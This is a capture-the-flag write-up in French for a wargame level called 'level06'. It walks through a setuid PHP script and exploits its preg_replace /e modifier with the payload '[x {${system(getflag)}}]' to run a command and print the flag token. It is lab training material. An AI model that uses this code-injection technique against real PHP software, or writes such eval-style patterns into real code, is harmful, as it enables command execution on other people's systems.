# level06

```bash
$ ls -l
total 12
-rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php

$ cat level06.php
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>

$ ./level06
PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4
$ ./level06 getflag
PHP Warning:  file_get_contents(getflag): failed to open stream: No such file or directory in /home/user/level06/level06.php on line 4
```

Le binaire level06 exécute le script PHP en passant un paramètre, le script PHP attend un fichier afin de lire son contenu afin de modifier son contenu puis de l’afficher.

```php
#!/usr/bin/php
<?php
function y($m) {
    // Remplace tous les points par " x " et tous les "@" par " y"
    $m = preg_replace("/\./", " x ", $m);
    $m = preg_replace("/@/", " y", $m);
    return $m;
}

function x($y, $z) {
    // Lit le contenu du fichier spécifié par $y
    $a = file_get_contents($y);

    // Remplace toutes les occurrences de "[x ...]" par le résultat de la fonction y(...)
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);

    // Remplace les crochets par des parenthèses
    $a = preg_replace("/\[/", "(", $a);
    $a = preg_replace("/\]/", ")", $a);

    return $a;
}

// Lit le premier argument comme fichier et applique les transformations
$r = x($argv[1], $argv[2]);
print $r;
?>
```

On va donc créer un fichier afin de lui exécuter la commande `getflag` grâce a cette **Vulnérabilité `preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);`**  si le regex match alors `preg_replace`  va exécuter la commande.

```php
$ nano /tmp/exploit.txt
[x {${system(getflag)}}]

$ ./level06 /tmp/exploit.txt
PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
```

flag06: wiok45aaoguiboiki2tuin6ub
